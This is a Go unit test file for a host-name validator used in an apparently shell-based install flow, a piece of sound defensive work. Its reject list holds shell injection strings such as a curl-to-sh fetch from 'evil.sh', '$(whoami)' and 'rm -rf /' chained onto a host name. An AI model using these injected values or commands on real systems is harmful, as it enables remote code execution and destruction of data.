package install_origin

import (
	"testing"

	"github.com/hcd233/aris-proxy-api/internal/util"
)

// TestIsSafeInstallHost_Allow 验证合法 host（域名、端口、IPv6、带端口域名）全部通过。
//
//	@author centonhuang
//	@update 2026-08-06 10:00:00
func TestIsSafeInstallHost_Allow(t *testing.T) {
	t.Parallel()
	cases := []string{
		"api.lvlvko.top",
		"api.lvlvko.top:8080",
		"localhost",
		"127.0.0.1",
		"127.0.0.1:3000",
		"example.com",
		"sub-domain.example.co",
		"[::1]:8080",
		"[2001:db8::1]",
		"a", // 最小合法输入
	}
	for _, host := range cases {
		if !util.IsSafeInstallHost(host) {
			t.Errorf("IsSafeInstallHost(%q) = false, want true", host)
		}
	}
}

// TestIsSafeInstallHost_Reject 验证含 shell 元字符 / 空白 / 空串的 host 全部拒绝。
//
// 覆盖单引号、双引号、反引号、$()、分号、管道、换行等 shell 注入向量。
//
//	@author centonhuang
//	@update 2026-08-06 10:00:00
func TestIsSafeInstallHost_Reject(t *testing.T) {
	t.Parallel()
	cases := []string{
		"",
		"evil.com'$(whoami)",
		"evil.com';curl evil.sh|sh;'",
		`evil.com"$(whoami)"`,
		"evil.com`whoami`",
		"evil.com;rm -rf /",
		"evil.com|sh",
		"evil.com\nrm -rf /",
		"evil.com\\",
		"evil.com/",
		"evil.com?x=1",
		"evil.com#frag",
		"evil.com space",
		"http://evil.com", // 带 scheme 的不是 host
	}
	for _, host := range cases {
		if util.IsSafeInstallHost(host) {
			t.Errorf("IsSafeInstallHost(%q) = true, want false", host)
		}
	}
}
